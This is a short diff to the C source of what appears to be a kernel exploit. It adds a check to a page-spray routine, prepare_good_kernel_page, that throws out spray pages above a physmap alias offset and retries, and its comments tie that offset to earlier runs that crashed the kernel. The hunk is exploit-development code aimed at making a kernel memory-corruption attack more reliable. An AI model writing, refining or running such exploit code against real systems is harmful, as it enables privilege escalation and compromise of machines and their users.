@@ -2456,11 +2456,26 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     /* Closest plateau used ≤12; raise with FOPS_MAX_ATTEMPTS=N if KS flaky. */
     max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 12, 1, 72);
   }
+  /*
+   * SPRAY_ALIAS_MAX (09-14): reject spray pages above this physmap offset.
+   * fl091910/fl094501 both died at pselect with 0xffffff87xxxxxxxx pages
+   * (~32GB offset — beyond the ~12-16GB DRAM window; the Z23/Z28
+   * "alias-wrap KP" class). Accept only the low DRAM alias by default.
+   * 0 disables the gate.
+   */
+  uintptr_t alias_max =
+      (uintptr_t)env_ulong("SPRAY_ALIAS_MAX", 0xffffff8400000000ULL);
   struct timespec deadline;
   clock_gettime(CLOCK_MONOTONIC, &deadline);
   deadline.tv_sec += env_int_range("PREPARE_DEADLINE_S", 180, 30, 3600);
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
+    if (base && alias_max && base > alias_max) {
+      pr_warning("spray page %016zx above alias_max %016zx — retry "
+                 "(high-alias KP class, fl091910/fl094501)\n",
+                 base, alias_max);
+      base = 0;
+    }
     if (base) {
       pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
       return base;
